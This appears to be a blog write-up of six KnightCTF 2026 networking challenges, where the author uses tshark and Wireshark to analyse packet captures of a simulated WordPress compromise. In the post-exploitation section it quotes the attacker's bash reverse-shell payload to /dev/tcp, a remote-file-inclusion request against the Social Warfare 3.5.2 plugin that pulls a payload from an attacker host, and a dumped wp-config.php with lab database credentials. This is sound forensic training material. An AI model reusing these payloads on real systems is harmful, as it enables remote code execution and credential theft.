---
layout: post
title:  "Networking Challenges"
date:   2026-01-21 15:43:10 -0400
author: robo.uzi
tags: [CTF]
permalink: /knightctf-2026-networking/
---

**Title**: Reconnaissance

**Author**: TareqAhamed (0xt4req)

**Category**: Networking

**Description**: A mid-sized e-learn company "Knight Blog" recently detected suspicious network activity on their infrastructure. As the lead forensic analyst for the Knight Security Response Team, you've been called in to investigate. The IT team has provided you with three packet captures taken at different stages of what appears to be a coordinated cyber attack. Your mission is to analyze these captures, trace the attacker's footsteps, and uncover the full scope of the breach.

**Question:** Our IDS flagged some suspicious scanning activity in the first capture. The attacker was probing our network to identify potential entry points. Analyze the traffic and determine how many ports were found to be open on the target system.

I download the pcap and open it in wireshark. I run this `tshark` command:
```shell
tshark -r pcap1.pcapng -Y "tcp.flags.syn==1 && tcp.flags.ack==1" -T fields -e tcp.srcport | sort -n | uniq  
22  
80  
443
```

I found no packets in wireshark from `tcp.port == 443 && ip.src == 192.168.1.102 && tcp.flags.syn==1 && tcp.flags.ack==1`. The attacker found ports `22` and `80` open.

`KCTF{2}`

___

**Title**: Gateway Identification

**Author**: TareqAhamed (0xt4req)

**Category**: Networking

**Description**: During the initial reconnaissance, the attacker gathered information about the network infrastructure. We need to identify the vendor of the network device acting as the default gateway in this capture. This information could help us understand if any vendor-specific vulnerabilities were exploited. Use pcap1.pcapng to solve this challenge.

**Flag Format KCTF{vendor_name}**

```shell
tshark -r pcap1.pcapng -Y "arp.opcode==2" -T fields -e eth.src | sort | uniq  
  
08:00:27:0e:62:25  
40:c2:ba:22:f8:ea  
88:bd:09:38:d7:a0  
9c:2f:9d:7e:74:6b
```

I get the vendor name here: [https://maclookup.app/search/result?mac=88:bd:09:38:d7:a0](https://maclookup.app/search/result?mac=88:bd:09:38:d7:a0)

`KCTF{Netis_Technology}`

___

**Title**: Exploitation

**Author**: TareqAhamed (0xt4req)

**Category**: Networking

**Description**: The attacker appears to have identified a web application running on our server. We need to determine what application was being targeted. Find the version and username associated with the application in the capture.

**Flag Format: KCTF{version_username}**

To find this flag I exported all http objects. Looking at the home page for the wordpress site shows version `6.9`. Running `string * | grep username` shows a login with the username `kadmin_user`.

`KCTF{6.9_kadmin_user}`

___

**Title**: Vulnerability Exploitation

**Author**: TareqAhamed (0xt4req)

**Category**: Networking

**Description**: Our web application was compromised through a vulnerable plugin. The attacker exploited a known vulnerability to gain initial access. Identify the vulnerable plugin and its version that was exploited.

**Flag Format KCTF{plugin_name_version}**

I found the vulnerable plugin in the http stream of the successful login: 
`<!-- Social Warfare v3.5.2 https://warfareplugins.com -->`.

`KCTF{social_warfare_3.5.2}`

___

**Title**: Post-Exploitation

**Author**: TareqAhamed (0xt4req)

**Category**: Networking

**Description**: After exploiting the vulnerability, the attacker established a persistent connection back to their command and control server. Analyze the traffic to identify the HTTP port used for the initial payload delivery and the port used for the reverse shell connection.

**Flag Format: KCTF{httpPort_revshellPort}**

I download the 3rd pcap and open it in wireshark. I exported all http objects again. Here is the reverse shell payload:
```shell
<pre>system("bash -c \"bash -i >& /dev/tcp/192.168.1.104/9576 0>&1\"")</pre>
```

In wireshark I find this request which shows the port used to deliver the payload:
```http
GET /wordpress//wp-admin/admin-post.php?swp_debug=load_options&swp_url=http://192.168.1.104:8767/payload.txt HTTP/1.1

Host: 192.168.1.102

User-Agent: python-requests/2.32.5

Accept-Encoding: gzip, deflate

Accept: */*

Connection: keep-alive
```

`KCTF{8767_9576}`

___

**Title**: Database Credentials Theft

**Author**: TareqAhamed (0xt4req)

**Category**: Networking

**Description**: The attacker's ultimate goal was to access our database. During the post-exploitation phase, they managed to extract database credentials from the compromised system. Find the database username and password that were exposed.

**Flag Format: KCTF{username_password}**

With the 3rd pcap open in wireshark I searched for `frame contains "username" && frame contains "password"`. I find the database credentials from the attackers activity:
```php
www-data@ubuntu-server-2:/var/www/html/wordpress$ cat wp-config.php

<?php
/**
* The base configuration for WordPress
*
* The wp-config.php creation script uses this file during the installation.
* You don't have to use the website, you can copy this file to "wp-config.php"
* and fill in the values.
*
* This file contains the following configurations:
*
* * Database settings
* * Secret keys
* * Database table prefix
* * ABSPATH
*
* @link https://developer.wordpress.org/advanced-administration/wordpress/wp-config/
*
* @package WordPress
*/

// ** Database settings - You can get this info from your web host ** //
/** The name of the database for WordPress */
define( 'DB_NAME', 'wordpress_db' );
/** Database username */
define( 'DB_USER', 'wpuser' );
/** Database password */
define( 'DB_PASSWORD', 'wp@user123' );
/** Database hostname */
define( 'DB_HOST', 'localhost' );
/** Database charset to use in creating database tables. */
define( 'DB_CHARSET', 'utf8mb4' );
/** The database collate type. Don't change this if in doubt. */
define( 'DB_COLLATE', '' );

etc...
```

`KCTF{wpuser_wp@user123}`

